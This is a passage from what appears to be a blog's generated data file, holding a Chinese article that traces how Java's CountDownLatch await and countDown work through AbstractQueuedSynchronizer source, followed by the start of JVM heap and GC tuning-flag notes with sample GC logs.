InterruptedException();</span><br><span class=\"line\">    doAcquireSharedInterruptibly(arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>AbstractQueuedSynchronizer</code>类的<code>doAcquireSharedInterruptibly</code>方法，其中<code>addWaiter</code>方法是往Node链表最后增加一个Node节点并返回该节点，Node对象中存储了当前线程t</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void doAcquireSharedInterruptibly(int arg)</span><br><span class=\"line\">    throws InterruptedException &#123;</span><br><span class=\"line\">    final Node node = addWaiter(Node.SHARED);</span><br><span class=\"line\">    boolean failed = true;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        for (;;) &#123;</span><br><span class=\"line\">            final Node p = node.predecessor();</span><br><span class=\"line\">            if (p == head) &#123;</span><br><span class=\"line\">                int r = tryAcquireShared(arg);</span><br><span class=\"line\">                if (r &gt;= 0) &#123;</span><br><span class=\"line\">                    setHeadAndPropagate(node, r);</span><br><span class=\"line\">                    p.next = null; // help GC</span><br><span class=\"line\">                    failed = false;</span><br><span class=\"line\">                    return;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                throw new InterruptedException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; finally &#123;</span><br><span class=\"line\">        if (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实际上由于arg值固定为1，上面方法相当于如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void doAcquireSharedInterruptibly(int arg)</span><br><span class=\"line\">    throws InterruptedException &#123;</span><br><span class=\"line\">    final Node node = addWaiter(Node.SHARED);</span><br><span class=\"line\">    boolean failed = true;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        for (;;) &#123;</span><br><span class=\"line\">            final Node p = node.predecessor();</span><br><span class=\"line\">            if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                throw new InterruptedException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; finally &#123;</span><br><span class=\"line\">        if (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>shouldParkAfterFailedAcquire</code>方法判断当前新增的节点（node）的前置节点（p）是否持有信号，并在没有持有信号的情况下，使其变更为持有信号状态（使state值设为SIGNAL）。<code>doAcquireSharedInterruptibly</code>中for循环直到<code>shouldParkAfterFailedAcquire</code>方法判断node的前置节点持有信号时，才会调用<code>parkAndCheckInterrupt</code>方法。</p>\n<p><code>parkAndCheckInterrupt</code>代码便是阻塞代码真正所在的位置，该功方法代码很简单，直接委托<code>LockSupport.park(this)</code>完成，<code>LockSupport.park(this)</code>代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void park(Object blocker) &#123;</span><br><span class=\"line\">    Thread t = Thread.currentThread();</span><br><span class=\"line\">    setBlocker(t, blocker);</span><br><span class=\"line\">    UNSAFE.park(false, 0L);</span><br><span class=\"line\">    setBlocker(t, null);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>setBlocker</code>时native的方法，它的作用是将第二个参数存储在第一个参数（线程）的堆内存中（即这是一个直接操作堆内存存储的实现），上面<code>park</code>方法中<code>UNSAFE.park</code>为阻塞功能的实现，点进去看发现也是一个native修饰的方法，即真正阻塞功能的还是由底层实现的，没法看到具体的代码。</p>\n<h2 id=\"countDown方法如何实现计数递减并取消阻塞\"><a href=\"#countDown方法如何实现计数递减并取消阻塞\" class=\"headerlink\" title=\"countDown方法如何实现计数递减并取消阻塞\"></a>countDown方法如何实现计数递减并取消阻塞</h2><p>与<code>await</code>方法一样，<code>countDown</code>方法也是将工作委托给了Sync类的方法完成。<code>CountDownLatch.Sync.releaseShared</code>代理完成该功能，<code>CountDownLatch.Sync.releaseShared</code>实际上也是已经由Sync的父类<code>AbstractQueuedSynchronizer</code>实现了，该方法如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public final boolean releaseShared(int arg) &#123;</span><br><span class=\"line\">    if (tryReleaseShared(arg)) &#123;</span><br><span class=\"line\">        doReleaseShared();</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>tryReleaseShared</code>方法尝试进行计数（即<code>state</code>）递减，<code>tryReleaseShared</code>方法中与前面一些方法一样，使用了原子性的方法<code>compareAndSetState</code>完成递减操作，该原子性操作保证了不会出现两次countDown之后<code>state</code>只递减一次的情况。当本次递减后计数达到0返回true，原先计数已经为0或者本次递减后计数不为0，返回false。<code>tryReleaseShared</code>返回true后，才能调用<code>doReleaseShared</code>完成Node恢复阻塞的线程。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">protected boolean tryReleaseShared(int releases) &#123;</span><br><span class=\"line\">    // Decrement count; signal when transition to zero</span><br><span class=\"line\">    for (;;) &#123;</span><br><span class=\"line\">        int c = getState();</span><br><span class=\"line\">        if (c == 0)</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        int nextc = c-1;</span><br><span class=\"line\">        if (compareAndSetState(c, nextc))</span><br><span class=\"line\">            return nextc == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如下所示为<code>doReleaseShared</code>方法代码，当<code>ws == Node.SIGNAL</code>（持有信号）时，调用<code>compareAndSetWaitStatus</code>尝试使Node不再持有信号（state值从SIGNAL变为0，<code>compareAndSetWaitStatus</code>调用的<code>unsafe.compareAndSwapInt</code>方法是原子性的方法），释放信号成功则进行<code>unparkSuccessor</code>的调用，不成功则继续循环（一般另外一条线程同时操作这个node的时候才会导致不成功），当<code>ws == 0</code>时，将该Node标识转为PROPAGATE后不再作处理，这种情况基本与<code>CountDownLatch</code>的业务无关，只是<code>AbstractQueuedSynchronizer</code>对Node链表结构的维护工作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void doReleaseShared() &#123;</span><br><span class=\"line\">    for (;;) &#123;</span><br><span class=\"line\">        Node h = head;</span><br><span class=\"line\">        if (h != null &amp;&amp; h != tail) &#123;</span><br><span class=\"line\">            int ws = h.waitStatus;</span><br><span class=\"line\">            if (ws == Node.SIGNAL) &#123;</span><br><span class=\"line\">                if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))</span><br><span class=\"line\">                    continue;            // loop to recheck cases</span><br><span class=\"line\">                unparkSuccessor(h);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else if (ws == 0 &amp;&amp;</span><br><span class=\"line\">                     !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))</span><br><span class=\"line\">                continue;                // loop on failed CAS</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (h == head)                   // loop if head changed</span><br><span class=\"line\">            break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后<code>unparkSuccessor</code>方法，找到head Node的下一个Node s，找到阻塞的线程<code>s.thread</code>， 调用<code>LockSupport.unpark(s.thread)</code>解除线程阻塞（核心代码<code>UNSAFE.unpark(thread)</code>方法，是native方法，发现一点有意思的情况：该方法运行完会改变head的指向，虽然与这里研究的关系不大，但传入参数是thread却能改变Sync的head Node指针确是挺有意思的）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void unparkSuccessor(Node node) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        int ws = node.waitStatus;</span><br><span class=\"line\">        if (ws &lt; 0)</span><br><span class=\"line\">            compareAndSetWaitStatus(node, ws, 0);</span><br><span class=\"line\"></span><br><span class=\"line\">        Node s = node.next;</span><br><span class=\"line\">        if (s == null || s.waitStatus &gt; 0) &#123;</span><br><span class=\"line\">            s = null;</span><br><span class=\"line\">            for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev)</span><br><span class=\"line\">                if (t.waitStatus &lt;= 0)</span><br><span class=\"line\">                    s = t;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (s != null)</span><br><span class=\"line\">            LockSupport.unpark(s.thread);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>CountDownLatch基本由<code>CountDownLatch.Sync</code>代理，Sync大量调用了<code>sun.misc.Unsafe</code>的代码。使用Unsafe的用于改变变量值的原子性方法，减少一些锁的使用；另外一点是使用park和<code>sun.misc.Unsaft.park</code>和<code>sun.misc.Unsaft.unpark</code>方法来实现指定线程的阻塞与解除阻塞。可惜的是<code>sun.misc.Unsafe</code>类oracle并不开放给外部代码使用。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"await方法如何实现线程等待\"><a href=\"#await方法如何实现线程等待\" class=\"headerlink\" title=\"await方法如何实现线程等待\"></a>await方法如何实现线程等待</h2><p><code>await</code>方法，由<code>CountDownLatch.Sync.acquireSharedInterruptibly</code>代理完成，实际上由Sync的父类<code>AbstractQueuedSynchronizer</code>实现了该方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public final void acquireSharedInterruptibly(int arg)</span><br><span class=\"line\">        throws InterruptedException &#123;</span><br><span class=\"line\">    if (Thread.interrupted())</span><br><span class=\"line\">        throw new InterruptedException();</span><br><span class=\"line\">    if (tryAcquireShared(arg) &lt; 0)</span><br><span class=\"line\">        doAcquireSharedInterruptibly(arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于arg参数入参固定为1, 而Sync实现的<code>tryAcquireShared</code>方法对于入参数1返回-1，因此实际相当于调用了如下代码，<code>Thread.interrupted</code>确保了当前线程不是interrupted的状态</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public final void acquireSharedInterruptibly(int arg)</span><br><span class=\"line\">        throws InterruptedException &#123;</span><br><span class=\"line\">    if (Thread.interrupted())</span><br><span class=\"line\">        throw new InterruptedException();</span><br><span class=\"line\">    doAcquireSharedInterruptibly(arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>AbstractQueuedSynchronizer</code>类的<code>doAcquireSharedInterruptibly</code>方法，其中<code>addWaiter</code>方法是往Node链表最后增加一个Node节点并返回该节点，Node对象中存储了当前线程t</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void doAcquireSharedInterruptibly(int arg)</span><br><span class=\"line\">    throws InterruptedException &#123;</span><br><span class=\"line\">    final Node node = addWaiter(Node.SHARED);</span><br><span class=\"line\">    boolean failed = true;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        for (;;) &#123;</span><br><span class=\"line\">            final Node p = node.predecessor();</span><br><span class=\"line\">            if (p == head) &#123;</span><br><span class=\"line\">                int r = tryAcquireShared(arg);</span><br><span class=\"line\">                if (r &gt;= 0) &#123;</span><br><span class=\"line\">                    setHeadAndPropagate(node, r);</span><br><span class=\"line\">                    p.next = null; // help GC</span><br><span class=\"line\">                    failed = false;</span><br><span class=\"line\">                    return;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                throw new InterruptedException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; finally &#123;</span><br><span class=\"line\">        if (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>实际上由于arg值固定为1，上面方法相当于如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void doAcquireSharedInterruptibly(int arg)</span><br><span class=\"line\">    throws InterruptedException &#123;</span><br><span class=\"line\">    final Node node = addWaiter(Node.SHARED);</span><br><span class=\"line\">    boolean failed = true;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        for (;;) &#123;</span><br><span class=\"line\">            final Node p = node.predecessor();</span><br><span class=\"line\">            if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                throw new InterruptedException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; finally &#123;</span><br><span class=\"line\">        if (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>shouldParkAfterFailedAcquire</code>方法判断当前新增的节点（node）的前置节点（p）是否持有信号，并在没有持有信号的情况下，使其变更为持有信号状态（使state值设为SIGNAL）。<code>doAcquireSharedInterruptibly</code>中for循环直到<code>shouldParkAfterFailedAcquire</code>方法判断node的前置节点持有信号时，才会调用<code>parkAndCheckInterrupt</code>方法。</p>\n<p><code>parkAndCheckInterrupt</code>代码便是阻塞代码真正所在的位置，该功方法代码很简单，直接委托<code>LockSupport.park(this)</code>完成，<code>LockSupport.park(this)</code>代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void park(Object blocker) &#123;</span><br><span class=\"line\">    Thread t = Thread.currentThread();</span><br><span class=\"line\">    setBlocker(t, blocker);</span><br><span class=\"line\">    UNSAFE.park(false, 0L);</span><br><span class=\"line\">    setBlocker(t, null);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>setBlocker</code>时native的方法，它的作用是将第二个参数存储在第一个参数（线程）的堆内存中（即这是一个直接操作堆内存存储的实现），上面<code>park</code>方法中<code>UNSAFE.park</code>为阻塞功能的实现，点进去看发现也是一个native修饰的方法，即真正阻塞功能的还是由底层实现的，没法看到具体的代码。</p>\n<h2 id=\"countDown方法如何实现计数递减并取消阻塞\"><a href=\"#countDown方法如何实现计数递减并取消阻塞\" class=\"headerlink\" title=\"countDown方法如何实现计数递减并取消阻塞\"></a>countDown方法如何实现计数递减并取消阻塞</h2><p>与<code>await</code>方法一样，<code>countDown</code>方法也是将工作委托给了Sync类的方法完成。<code>CountDownLatch.Sync.releaseShared</code>代理完成该功能，<code>CountDownLatch.Sync.releaseShared</code>实际上也是已经由Sync的父类<code>AbstractQueuedSynchronizer</code>实现了，该方法如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public final boolean releaseShared(int arg) &#123;</span><br><span class=\"line\">    if (tryReleaseShared(arg)) &#123;</span><br><span class=\"line\">        doReleaseShared();</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>tryReleaseShared</code>方法尝试进行计数（即<code>state</code>）递减，<code>tryReleaseShared</code>方法中与前面一些方法一样，使用了原子性的方法<code>compareAndSetState</code>完成递减操作，该原子性操作保证了不会出现两次countDown之后<code>state</code>只递减一次的情况。当本次递减后计数达到0返回true，原先计数已经为0或者本次递减后计数不为0，返回false。<code>tryReleaseShared</code>返回true后，才能调用<code>doReleaseShared</code>完成Node恢复阻塞的线程。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">protected boolean tryReleaseShared(int releases) &#123;</span><br><span class=\"line\">    // Decrement count; signal when transition to zero</span><br><span class=\"line\">    for (;;) &#123;</span><br><span class=\"line\">        int c = getState();</span><br><span class=\"line\">        if (c == 0)</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        int nextc = c-1;</span><br><span class=\"line\">        if (compareAndSetState(c, nextc))</span><br><span class=\"line\">            return nextc == 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如下所示为<code>doReleaseShared</code>方法代码，当<code>ws == Node.SIGNAL</code>（持有信号）时，调用<code>compareAndSetWaitStatus</code>尝试使Node不再持有信号（state值从SIGNAL变为0，<code>compareAndSetWaitStatus</code>调用的<code>unsafe.compareAndSwapInt</code>方法是原子性的方法），释放信号成功则进行<code>unparkSuccessor</code>的调用，不成功则继续循环（一般另外一条线程同时操作这个node的时候才会导致不成功），当<code>ws == 0</code>时，将该Node标识转为PROPAGATE后不再作处理，这种情况基本与<code>CountDownLatch</code>的业务无关，只是<code>AbstractQueuedSynchronizer</code>对Node链表结构的维护工作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void doReleaseShared() &#123;</span><br><span class=\"line\">    for (;;) &#123;</span><br><span class=\"line\">        Node h = head;</span><br><span class=\"line\">        if (h != null &amp;&amp; h != tail) &#123;</span><br><span class=\"line\">            int ws = h.waitStatus;</span><br><span class=\"line\">            if (ws == Node.SIGNAL) &#123;</span><br><span class=\"line\">                if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))</span><br><span class=\"line\">                    continue;            // loop to recheck cases</span><br><span class=\"line\">                unparkSuccessor(h);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else if (ws == 0 &amp;&amp;</span><br><span class=\"line\">                     !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))</span><br><span class=\"line\">                continue;                // loop on failed CAS</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (h == head)                   // loop if head changed</span><br><span class=\"line\">            break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后<code>unparkSuccessor</code>方法，找到head Node的下一个Node s，找到阻塞的线程<code>s.thread</code>， 调用<code>LockSupport.unpark(s.thread)</code>解除线程阻塞（核心代码<code>UNSAFE.unpark(thread)</code>方法，是native方法，发现一点有意思的情况：该方法运行完会改变head的指向，虽然与这里研究的关系不大，但传入参数是thread却能改变Sync的head Node指针确是挺有意思的）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private void unparkSuccessor(Node node) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        int ws = node.waitStatus;</span><br><span class=\"line\">        if (ws &lt; 0)</span><br><span class=\"line\">            compareAndSetWaitStatus(node, ws, 0);</span><br><span class=\"line\"></span><br><span class=\"line\">        Node s = node.next;</span><br><span class=\"line\">        if (s == null || s.waitStatus &gt; 0) &#123;</span><br><span class=\"line\">            s = null;</span><br><span class=\"line\">            for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev)</span><br><span class=\"line\">                if (t.waitStatus &lt;= 0)</span><br><span class=\"line\">                    s = t;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (s != null)</span><br><span class=\"line\">            LockSupport.unpark(s.thread);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>CountDownLatch基本由<code>CountDownLatch.Sync</code>代理，Sync大量调用了<code>sun.misc.Unsafe</code>的代码。使用Unsafe的用于改变变量值的原子性方法，减少一些锁的使用；另外一点是使用park和<code>sun.misc.Unsaft.park</code>和<code>sun.misc.Unsaft.unpark</code>方法来实现指定线程的阻塞与解除阻塞。可惜的是<code>sun.misc.Unsafe</code>类oracle并不开放给外部代码使用。</p>\n"},{"title":"JVM堆栈笔记","date":"2019-02-17T02:49:00.000Z","keywords":"jvm, 模型, 调优参数","rId":"MB-19021701","_content":"\n## 知识点\n\n1. 堆内存默认新生代和老年代空间占比：1 : 2\n2. 新生代中默认单个Survivor区和Eden区的空间占比：1 : 8\n3. https://blog.csdn.net/leunging/article/details/80599282\n\n## 参数\n\n1. -Xms        堆内存初始大小（记忆方式，m以内存的单词memory记忆，s以small记忆，想象一下衣服的尺号就好记了），使用时：-Xms256m\n\n2. -Xmx        堆内存最大大小（记忆方式同上，最后一个x以extra记忆，同样想象下衣服的加大号就好记了）\n\n3. -Xmn        堆内存中新生代的最大内存和初始内存设为一致的值了，不再变化（记忆方式同上，n使用new记忆）\n\n4. -XX:NewSize        堆内存中新生代的初始内存，使用时：-XX:NewSize=256m\n\n5. -XX:MaxNewSize        堆内存中新生代的最大内存\n\n6. -Xss(或-XX:ThreadStackSize)        每个线程的栈内存的大小（默认1M），该数值影响可以启动的线程的数量，也影响每个线程的栈帧数量（记忆方式，Stack Size）\n\n7. -XX:+PrintGC(别名-verbose:gc)        打印gc的信息\n\n8. -XX:+PrintGCTimeStamps        以基准时间的形式打印GC的时间戳\n\n   不开启时打印如下\n\n   ```\n   [GC (Allocation Failure)  155644K->36463K(402432K), 0.0095270 secs]\n   ```\n\n   开启时打印如下\n\n   ```\n   4.609: [GC (Allocation Failure)  162642K->34898K(396800K), 0.0105201 secs]\n   ```\n\n5. -XX:+PrintGCDateStamps        以日期的形式打印GC时间戳（可以设置日期形式和基准形式同时打印）\n\n   开启时打印如下\n\n   ```\n   2019-02-25T09:36:33.424+0800: [GC (Allocation Failure)  155673K->36616K(397824K), 0.0084967 secs]\n   ```\n\n   同时开启时打印如下\n\n   ```\n   2019-02-25T09:38:16.009+0800: 6.488: [GC (Allocation Failure)  169212K->42272K(518656K), 0.0163488 secs]\n   ```\n\n6. -XX:+PrintGCDetails        打印gc的详细信息，启动脚本下运行会自动开启-XX:+PrintGC，jinfo附加下运行不会自动开启\n\n   开启时打印如下\n\n   ```\n   [GC (Allocation Failure) [PSYoungGen: 137517K->9963K(147456K)] 169528K->41982K(534528K), 0.0124863 secs] [Times: user=0.04 sys=0.00, real=0.01 secs] \n   ```\n\n7. -XX:+PrintHeapAtGC        在进行GC的前后打印出堆的信息\n\n   开启时打印如下\n\n   ```\n   {Heap before GC invocations=1 (full 0):\n    PSYoungGen      total 147456K, used 131072K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)\n     eden space 131072K, 100% used [0x00000000f6000000,0x00000000fe000000,0x00000000fe000000)\n     from space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)\n     to   space 16384K, 0% used [0x00000000fe000000,0x00000000fe000000,0x00000000ff000000)\n    ParOldGen       total 163840K, used 0K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)\n     object space 163840K, 0% used [0x0000000087e00000,0x0000000087e00000,0x0000000091e00000)\n    Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K\n     class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K\n   [GC (Allocation Failure)  131072K->17089K(311296K), 0.0130938 secs]\n   Heap after GC invocations=1 (full 0):\n    PSYoungGen      total 147456K, used 16366K [0x00000000f6000000, 